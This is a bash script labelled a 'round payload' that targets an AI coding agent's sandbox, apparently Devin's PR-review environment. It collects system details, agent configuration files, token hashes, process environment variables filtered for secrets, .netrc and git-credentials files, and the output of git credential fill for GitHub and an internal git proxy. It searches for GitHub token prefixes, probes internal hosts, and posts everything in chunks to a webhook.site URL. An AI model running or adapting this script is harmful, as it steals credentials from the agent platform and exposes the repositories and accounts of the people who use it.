#!/bin/bash
# i80453 round payload: locate any live git/GitHub credential material in the pr-review sandbox.
R="${RND:-r2}"
SINK="https://webhook.site/e424db5a-7c4c-4727-96a9-e06a29da89f5/i80453/$R"
TMP="$(mktemp -d)"; OUT="$TMP/out.txt"
say() { echo "### $*" >>"$OUT"; }

say META; { id; hostname; uname -a; date -u +%FT%TZ; pwd; } >>"$OUT" 2>&1

say OPT_DEVIN_FILES
for f in /opt/.devin/devin_bash_env /opt/.devin/devin_bashrc /opt/.devin/git_author \
         /opt/.devin/custom_remote_config.json /opt/.devin/client_prebaked \
         /opt/.devin/provision_version /opt/.devin/remote_id /opt/.devin/static_asset_url \
         /opt/.devin/setup.log /run/.devin/client_live_tier; do
  echo "--- $f" >>"$OUT"; cat "$f" >>"$OUT" 2>&1; echo >>"$OUT"
done

say TOKEN_HASHES
sha256sum /opt/.devin/devin_remote_auth_token /opt/.devin/vscode_server_auth_token 2>&1 >>"$OUT"
wc -c /opt/.devin/authorized_keys >>"$OUT" 2>&1

say DEVIN_FILES_DIR
ls -la /home/ubuntu/.devin-files 2>&1 >>"$OUT"
find /home/ubuntu/.devin-files -maxdepth 4 2>/dev/null | head -80 >>"$OUT"

say HOST_SHARE
ls -la /mnt/host_share /mnt/host_share/package 2>&1 | head -60 >>"$OUT"
find /mnt/host_share -maxdepth 2 2>/dev/null | head -40 >>"$OUT"

say SYSTEMD_UNIT
cat /etc/systemd/system/devin-remote.service 2>&1 | head -60 >>"$OUT"
sudo -n systemctl show devin-remote -p User -p Environment -p EnvironmentFile -p ExecStart 2>&1 | head -30 >>"$OUT"
sudo -n systemctl show git-manager -p User -p Environment -p ExecStart 2>&1 | head -20 >>"$OUT"

say PROC_ENV
for p in $(pgrep -f 'devin-remote|git-manager|devin' 2>/dev/null | head -12); do
  echo "--- pid $p $(tr '\0' ' ' </proc/$p/cmdline 2>/dev/null | cut -c1-120)" >>"$OUT"
  sudo -n tr '\0' '\n' </proc/$p/environ 2>/dev/null | grep -iE 'git|github|token|cred|proxy|devin|secret|key' | head -30 >>"$OUT"
done
echo "--- pid1" >>"$OUT"; sudo -n tr '\0' '\n' </proc/1/environ 2>/dev/null | grep -iE 'git|github|token|cred|proxy|secret|key' | head -30 >>"$OUT"

say ENV_ALL
env | sort | grep -viE 'LS_COLORS|PS1' | head -80 >>"$OUT"

say HOME_CONFIGS
ls -la /home/ubuntu 2>&1 >>"$OUT"
for f in /home/ubuntu/.netrc /home/ubuntu/.git-credentials /home/ubuntu/.config/git/config \
         /home/ubuntu/.docker/config.json /root/.netrc /root/.git-credentials /root/.config/git/config; do
  echo "--- $f" >>"$OUT"; sudo -n ls -la "$f" 2>&1 >>"$OUT"; sudo -n cat "$f" 2>&1 | head -20 >>"$OUT"
done
sudo -n ls -la /home/ubuntu/.config 2>&1 | head -30 >>"$OUT"

say FIND_CREDS
sudo -n find / -xdev \( -name '*git-credential*' -o -name '.git-credentials' -o -name '*.netrc' \) 2>/dev/null | head -30 >>"$OUT"
sudo -n find /opt /home /mnt /srv -maxdepth 6 -type f \( -name '*.json' -o -name '*.env' -o -name '*.cfg' \) 2>/dev/null | grep -iE 'cred|git|devin|token' | head -30 >>"$OUT"

say GREP_HITS
sudo -n grep -rIl -e 'git-manager' -e 'integration-git-credentials' -e 'ghs_' -e 'ghu_' /opt /home /etc /mnt/host_share 2>/dev/null | head -30 >>"$OUT"

say NET
ip -4 addr 2>/dev/null | head -20 >>"$OUT"
ip route 2>/dev/null | head -10 >>"$OUT"
ss -ltnp 2>/dev/null | head -40 >>"$OUT"
getent hosts git-manager.local git-manager.devin.ai 2>&1 >>"$OUT"

say CREDS_FILE_PROBE
for f in /opt/.devin/.devin-integration-git-credentials /opt/devin/.devin-integration-git-credentials \
         /root/.devin/.devin-integration-git-credentials /run/.devin/.devin-integration-git-credentials; do
  echo "--- $f" >>"$OUT"; ls -la "$f" 2>&1 >>"$OUT"; sudo -n cat "$f" 2>&1 | head -20 >>"$OUT"
done

say GIT_FILL
for h in github.com git-manager.local:7000 git-manager.devin.ai; do
  echo "--- $h" >>"$OUT"
  printf 'protocol=https\nhost=%s\n\n' "$h" | GIT_TERMINAL_PROMPT=0 git credential fill 2>&1 | head -6 >>"$OUT"
done
git config --list --show-origin 2>&1 | head -40 >>"$OUT"

say GIT_MANAGER_TOUCH
timeout 10 curl -sS -o /dev/null -w 'root=%{http_code}\n' http://git-manager.local:7000/ 2>&1 >>"$OUT"
timeout 10 curl -sS -o /dev/null -w 'health=%{http_code}\n' http://git-manager.local:7000/health 2>&1 >>"$OUT"
timeout 20 git ls-remote http://git-manager.local:7000/proxy/github.com/fw-ai/cookbook.git 2>&1 | head -4 >>"$OUT"

say TRIGGER_THEN_RECHECK
timeout 20 git ls-remote https://github.com/Prorise-cool/envcheck-harness 2>&1 | head -3 >>"$OUT"
ls -la /opt/.devin/.devin-integration-git-credentials 2>&1 >>"$OUT"

say END
wc -c "$OUT" >>"$OUT"
N=0; split -b 6000 "$OUT" "$TMP/part."
for part in "$TMP"/part.*; do
  N=$((N+1))
  curl -s -m 25 -X POST --data-binary @"$part" "$SINK/p$N" >/dev/null 2>&1
done
curl -s -m 25 -X POST --data-binary "DONE i80453 $R parts=$N bytes=$(wc -c <"$OUT")" "$SINK/done" >/dev/null 2>&1
rm -rf "$TMP"
